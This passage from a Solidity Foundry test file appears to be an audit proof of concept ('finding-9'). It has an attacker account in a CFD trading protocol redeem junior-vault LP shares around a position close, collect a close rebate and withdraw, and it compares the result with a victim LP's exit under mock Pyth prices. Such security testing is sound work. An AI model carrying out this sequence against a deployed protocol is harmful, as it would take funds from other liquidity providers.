            router.settleLpEpoch(_basket(closeCommitTime, closeCommitTime - 1));
            assertEq(router.nextExecuteId(), 0, "LP settlement did not execute an order");
            result.firstFundedShares = juniorVault.claimableRedeemRequest(exitId, ATTACKER);
            assertGt(result.firstFundedShares, 0, "LP shares fund before close commitment");
            vm.prank(ATTACKER);
            result.firstClaimCash = juniorVault.claimRedeem(exitId, result.firstFundedShares, ATTACKER, ATTACKER);
            result.attackerLpCash = result.firstClaimCash;
        }

        uint64 closeId = _commit(true);
        assertEq(vm.getBlockTimestamp(), closeCommitTime, "same close commit time in both branches");
        uint256 executionTime = closeCommitTime + 1;
        bytes[] memory sameFreshTick = _basket(executionTime, closeCommitTime);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(executionTime);
        _executeClose(closeId, sameFreshTick, result);

        if (!fundBeforeClose) {
            vm.prank(KEEPER);
            router.settleLpEpoch(sameFreshTick);
            result.firstFundedShares = juniorVault.claimableRedeemRequest(exitId, ATTACKER);
            assertGt(result.firstFundedShares, 0, "control LP shares fund after close");
            vm.prank(ATTACKER);
            result.firstClaimCash = juniorVault.claimRedeem(exitId, result.firstFundedShares, ATTACKER, ATTACKER);
            result.attackerLpCash = result.firstClaimCash;
        }
        assertGt(result.firstClaimCash, 0, "first funding pays actual USDG cash");

        return _finishBranch(exitId, attackerShares, victimShares, 0, result);
    }

    function _finishBranch(
        uint256 exitId,
        uint256 attackerShares,
        uint256 victimShares,
        int256 closeDriftPpm,
        Branch memory result
    ) private returns (Branch memory) {
        uint256 remainingShares = attackerShares - result.firstFundedShares;
        if (remainingShares != 0) {
            vm.warp(pool.lpEpochStart(exitId + 1));
            uint256 markTime = vm.getBlockTimestamp();
            vm.prank(KEEPER);
            router.settleLpEpoch(_basketWithDrift(markTime, markTime - 1, closeDriftPpm));
            uint256 funded = juniorVault.claimableRedeemRequest(exitId, ATTACKER);
            assertEq(funded, remainingShares, "remaining attacker shares fund after the close");
            vm.prank(ATTACKER);
            result.attackerLpCash += juniorVault.claimRedeem(exitId, funded, ATTACKER, ATTACKER);
        }
        assertEq(juniorVault.balanceOf(ATTACKER), 0, "attacker fully exits Junior");
        assertEq(usdg.balanceOf(ATTACKER), result.attackerLpCash, "LP claim is actual attacker USDG");

        result.traderCash = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, result.traderCash);
        result.attackerTotalCash = usdg.balanceOf(ATTACKER);
        assertEq(result.attackerTotalCash, result.attackerLpCash + result.traderCash);

        vm.prank(VICTIM);
        uint256 victimExitId = juniorVault.requestRedeem(victimShares, VICTIM, VICTIM);
        vm.warp(pool.lpEpochStart(victimExitId));
        uint256 victimMarkTime = vm.getBlockTimestamp();
        vm.prank(KEEPER);
        router.settleLpEpoch(_basketWithDrift(victimMarkTime, victimMarkTime - 1, closeDriftPpm));
        uint256 victimFunded = juniorVault.claimableRedeemRequest(victimExitId, VICTIM);
        assertEq(victimFunded, victimShares, "victim exits all shares in both branches");
        vm.prank(VICTIM);
        result.victimLpCash = juniorVault.claimRedeem(victimExitId, victimFunded, VICTIM, VICTIM);
        assertEq(usdg.balanceOf(VICTIM), result.victimLpCash, "victim claim is actual USDG");
        return result;
    }

    function _executeClose(
        uint64 closeId,
        bytes[] memory tick,
        Branch memory result
    ) private {
        uint256 poolCashBefore = usdg.balanceOf(address(pool));
        uint256 traderCreditBefore = clearinghouse.balanceAssets(ATTACKER);
        _startRecordingLogs();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory execution = router.executeOrder(closeId, tick);
        assertEq(uint8(execution.status), uint8(OrderV3Types.LifecycleStatus.Executed), "V3 close executes");
        Vm.Log[] memory logs = _takeRecordedLogs();
        uint256 rebateEvents;
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].emitter == address(engine.settlementSidecar()) && logs[i].topics.length == 2
                    && logs[i].topics[0] == ICfdEngineSettlementSidecar.ActionRebateSettled.selector
            ) {
                ++rebateEvents;
                assertEq(logs[i].topics[1], bytes32(uint256(uint160(ATTACKER))), "rebate belongs to attacker");
                (uint256 assessed, uint256 paid, uint256 waived) = abi.decode(logs[i].data, (uint256, uint256, uint256));
                assertGt(assessed, 0, "close assesses rebate");
                assertGt(paid, 0, "close actually pays rebate");
                assertEq(waived, 0, "no rebate is waived");
                result.closeRebatePaid = paid;
            }
        }
        OrderV3Types.OrderReceipt memory receipt = _verifiedReceipt(router.lifecycleBook(), closeId);
        result.closeFill = receipt.executionPrice;
        result.closeNeutralMark = receipt.neutralMarkPrice;
        result.closeVpi = receipt.economics.vpiAssets;
        result.closeRealizedPnl = receipt.economics.realizedPnlAssets;
        result.closeExecutionFee = receipt.economics.executionFeeAssets;
        uint256 poolCashAfter = usdg.balanceOf(address(pool));
        uint256 traderCreditAfter = clearinghouse.balanceAssets(ATTACKER);
        if (result.closeVpi < 0) {
            assertEq(rebateEvents, 1, "one authenticated close rebate settlement event");
            assertLt(poolCashAfter, poolCashBefore, "Pool spends settlement cash on close");
            assertGt(traderCreditAfter, traderCreditBefore, "trader receives settlement credit on close");
            result.closePoolCashPaid = poolCashBefore - poolCashAfter;
            result.closeTraderCreditIncrease = traderCreditAfter - traderCreditBefore;
        } else {
            assertEq(rebateEvents, 0, "zero-VPI control has no rebate payment");
        }
        (uint256 remaining,,,,,,) = engine.positions(ATTACKER);
        assertEq(remaining, 0, "the LONG is fully closed");
        assertEq(router.nextExecuteId(), 0, "no queued order remains");
    }

    function _commit(
        bool isClose
    ) private returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: isClose ? bytes32("finding-9-close") : bytes32("finding-9-open"),
            side: CfdTypes.Side.LONG,
            sizeDelta: POSITION_SIZE,
            marginDelta: isClose ? 0 : OPEN_MARGIN,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(ATTACKER);
        orderId = router.commitOrder(request);
    }

    function _fundJunior(
        address lp,
        uint256 amount
    ) private {
        usdg.mint(lp, amount);
        vm.startPrank(lp);
        usdg.approve(address(juniorVault), amount);
        uint256 id = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(id));
        pool.settleLpEpoch(0, 0); // No position exists during setup deposits.
        assertEq(juniorVault.claimableDepositRequest(id, lp), amount);
        vm.prank(lp);
        juniorVault.claimDeposit(id, amount, lp, lp);
    }

    function _fundTrader(
        address trader,
        uint256 amount
    ) private {
        usdg.mint(trader, amount);
        vm.startPrank(trader);
        usdg.approve(address(clearinghouse), amount);
        clearinghouse.deposit(trader, amount);
        vm.stopPrank();
    }

    function _basket(
        uint256 publishTime,
        uint256 previousTime
    ) private view returns (bytes[] memory data) {
        return _basketWithDrift(publishTime, previousTime, 0);
    }

    /// @dev A shared basket drift changes direct Pyth prices and inversely changes inverted Pyth prices.
    ///      Thus all six normalized components move in the same direction without changing basket composition.
    function _basketWithDrift(
        uint256 publishTime,
        uint256 previousTime,
        int256 driftPpm
    ) private view returns (bytes[] memory data) {
        uint256 factorPpm = uint256(int256(1_000_000) + driftPpm);
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            bool inverted = i == 1 || i == 3 || i == 4 || i == 5;
            uint256 rawPrice = inverted ? (1e16 + basePrices[i] / 2) / basePrices[i] : basePrices[i];
            rawPrice = inverted ? rawPrice * 1_000_000 / factorPpm : rawPrice * factorPpm / 1_000_000;
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(rawPrice)),
                    conf: uint64(rawPrice * inputConfidencePpm / 1_000_000),
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: previousTime
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

}
```
